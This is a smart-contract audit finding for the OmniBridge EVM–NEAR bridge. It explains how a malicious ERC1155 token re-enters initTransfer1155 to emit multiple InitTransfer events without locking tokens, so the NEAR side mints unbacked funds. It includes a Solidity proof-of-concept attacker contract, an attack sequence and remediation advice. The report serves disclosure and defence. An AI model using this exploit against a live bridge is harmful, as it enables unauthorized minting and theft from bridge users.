Audit Report

## Title
Re-entrancy via Malicious ERC1155 Token in `initTransfer1155` Enables Unauthorized NEAR-Side Minting — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` in `OmniBridge.sol` makes an external call to an attacker-controlled `tokenAddress` via `IERC1155.safeTransferFrom` before emitting `InitTransfer`. A malicious ERC1155 contract can re-enter `initTransfer1155` during this call, causing multiple `InitTransfer` events to be emitted with distinct, valid nonces while locking zero real tokens. The NEAR side treats each emitted event as proof of a locked deposit and processes the corresponding transfer, resulting in unbacked minting.

## Finding Description

`initTransfer1155` increments `currentOriginNonce` at line 448, then makes an external call to the attacker-controlled `tokenAddress` at line 458, and only emits `InitTransfer` after the external call returns at line 480. There is no `ReentrancyGuard` and no whitelist check on `tokenAddress`.

A malicious `safeTransferFrom` implementation can call back into `initTransfer1155` arbitrarily many times before returning. Each re-entrant invocation receives a fresh, unique nonce (because `currentOriginNonce` is incremented at the top of each call). As the call stack unwinds, each frame emits a valid `InitTransfer` event with its own unique nonce. The malicious token never actually transfers any tokens to the bridge.

The `onERC1155Received` guard at line 530 is irrelevant: it only blocks direct ERC1155 pushes where `operator != address(this)`. The malicious token's `safeTransferFrom` calls back into `initTransfer1155` directly — `onERC1155Received` is never invoked in this attack path.

The documented invariant in `evm/CLAUDE.md` states: *"Event–transfer atomicity: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction."* This invariant is broken by the reentrancy.

The NEAR-side `fin_transfer` flow (`near/omni-bridge/src/lib.rs`) uses `finalised_transfers` (a `LookupSet`) to prevent replay of the same `(origin_chain, origin_nonce)` pair. However, because each re-entrant call receives a **distinct** nonce, each emitted event is treated as a separate, unique transfer — the replay guard does not help here.

## Impact Explanation

Each re-entrant frame emits a valid `InitTransfer` event with a unique `currentOriginNonce`. The NEAR bridge's `fin_transfer` → `fin_transfer_callback` path verifies the proof against the emitter address (the registered factory) and processes each event independently. With N re-entrant calls, the attacker obtains N × `amount` minted bridged tokens on NEAR while locking zero (or one) real ERC1155 tokens on EVM. This is direct unauthorized minting and unbacked inflation of bridged supply — matching the Critical impact class: *"unauthorized minting… of bridged funds."*

## Likelihood Explanation

The entry point is fully public (`external`, no role check, no whitelist). Any address can supply an arbitrary `tokenAddress`. Deploying a malicious ERC1155 contract costs only gas. No privileged access, leaked keys, or external dependency failure is required. The attack is self-contained in a single transaction and is repeatable.

## Recommendation

1. **Add `ReentrancyGuard`**: Apply OpenZeppelin's `nonReentrant` modifier to `initTransfer1155` (and `initTransfer` for consistency).
2. **Checks-Effects-Interactions**: Emit `InitTransfer` and call `initTransferExtension` *before* the external `safeTransferFrom` call, consistent with the documented invariant *"State before external calls"* in `evm/CLAUDE.md`.
3. **Token allowlist**: Require that `tokenAddress` is pre-registered via `logMetadata1155` before `initTransfer1155` will accept it, preventing use of arbitrary attacker-controlled contracts.

## Proof of Concept

```solidity
contract MaliciousERC1155 is IERC1155 {
    OmniBridge bridge;
    uint256 depth;

    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes calldata
    ) external override {
        // Re-enter up to 5 times; never actually transfer tokens
        if (depth < 5) {
            depth++;
            bridge.initTransfer1155(
                address(this), id, uint128(amount), 0, 0, "attacker.near", ""
            );
            depth--;
        }
        // onERC1155Received is never called; no tokens move
    }
    // ... other IERC1155 stubs returning true/zero
}

// Attack sequence:
// 1. Deploy MaliciousERC1155 pointing at bridge
// 2. (Optional) bridge.logMetadata1155(address(malicious), tokenId)
// 3. Call bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "attacker.near", "")
//    → safeTransferFrom re-enters 5 times
//    → 5 InitTransfer events emitted with nonces N, N+1, N+2, N+3, N+4
//    → 0 real tokens locked
//    → NEAR side processes 5 independent fin_transfer calls, minting 5 × amount tokens
```

Relevant code locations:
- Nonce increment before external call: [1](#0-0) 
- External call to attacker-controlled address: [2](#0-1) 
- Event emitted after external call (broken atomicity): [3](#0-2) 
- `onERC1155Received` guard (irrelevant to this attack path): [4](#0-3) 
- Documented broken invariant: [5](#0-4) 
- NEAR-side replay guard (per-nonce, does not prevent distinct-nonce events): [6](#0-5)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-448)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L458-464)
```text
        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L480-489)
```text
        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```

**File:** near/omni-bridge/src/lib.rs (L2226-2231)
```rust
    fn add_fin_transfer(&mut self, transfer_id: &TransferId) -> NearToken {
        let storage_usage = env::storage_usage();
        require!(
            self.finalised_transfers.insert(transfer_id),
            BridgeError::TransferAlreadyFinalised.as_ref()
        );
```
